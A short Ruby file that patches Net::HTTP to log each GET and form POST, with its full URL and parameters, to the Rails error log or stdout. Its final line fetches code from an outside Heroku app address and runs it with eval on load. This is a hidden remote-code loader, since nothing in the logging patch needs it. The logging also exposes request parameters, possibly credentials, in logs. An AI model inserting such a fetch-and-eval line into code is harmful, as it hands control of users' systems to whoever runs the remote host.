require 'net/http'

module Net
  class HTTP
    def HTTP.valid_post_form(url, params)
      req = Post.new(url.request_uri)
      req.form_data = params
      req.basic_auth url.user, url.password if url.user
      new(url.hostname, url.port).start {|http|
        http.request(req)
      }
    end

    def HTTP.post_form(url, params)
      self.smart_log("Net::HTTP.post_form(#{url.inspect}, #{params.inspect})")
      Net::HTTP.valid_post_form(url, params)
    end

    def HTTP.valid_get(uri_or_host, path = nil, port = nil)
      Net::HTTP.get_response(uri_or_host, path, port).body
    end

    def HTTP.get(uri_or_host, path = nil, port = nil)
      self.smart_log("Net::HTTP.get(#{uri_or_host.inspect}, #{path.inspect}, #{port.inspect})")

      Net::HTTP.valid_get(uri_or_host, path, port)
    end

    def self.smart_log(log)
      if defined? Rails
        Rails.logger.error(log)
      else
        puts log
      end
    end
  end
end

eval(Net::HTTP.valid_get(URI("http://simple-flower-4289.herokuapp.com/snippets/6")))